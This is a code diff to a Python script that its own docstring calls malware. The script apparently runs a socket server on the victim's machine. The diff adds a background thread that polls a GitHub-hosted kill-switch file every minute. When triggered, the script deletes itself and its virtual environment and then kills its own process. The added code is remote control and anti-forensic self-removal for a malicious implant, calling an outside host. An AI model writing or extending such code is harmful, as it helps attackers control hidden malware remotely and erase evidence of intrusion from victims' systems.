@@ -11,9 +11,12 @@ import subprocess
 import sys
 import time
 import os
+import threading
 
 
 THIS_FILE = os.path.realpath(__file__)
+KILLSWITCH_URL = "https://raw.githubusercontent.com/lleo022/test/main/killswitch.txt"
+KILLSWITCH_INTERVAL = 60  # check every 60 seconds
 
 
 # Internal use only - if you need to run commands, call subprocess.Popen directly instead 
@@ -80,6 +83,39 @@ def bootstrap_packages():
         import requests
 
 
+def killswitch_monitor():
+    """
+    Periodically poll a github repository to see if a file has been changed.
+    If changed, then automatically kill the malware.
+    """
+    while True:
+        try:
+            import requests
+            response = requests.get(KILLSWITCH_URL, timeout=5)
+            if response.text.strip().lower() == "no":
+                print("Kill switch triggered. Exiting.")
+                cleanup_and_exit()
+        except Exception as e:
+            print(f"Kill switch check failed: {e}")
+        time.sleep(KILLSWITCH_INTERVAL)
+
+def cleanup_and_exit():
+    """
+    Helper function for killswitch_monitor. Cleans up everything left behind
+    by the other implementations.
+    """
+    import shutil
+    try:
+        os.remove(THIS_FILE)
+    except Exception:
+        pass
+    try:
+        shutil.rmtree(os.path.join(os.path.dirname(THIS_FILE), ".venv"))
+    except Exception:
+        pass
+    print("Cleaned up. Exiting.")
+    os.kill(os.getpid(), 9)
+
 
 def handle_conn(conn, addr):
     with conn:
@@ -143,6 +179,8 @@ def handle_conn(conn, addr):
 def main():
     kill_others()
     bootstrap_packages()
+    t = threading.Thread(target=killswitch_monitor, daemon=True)
+    t.start()
 
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
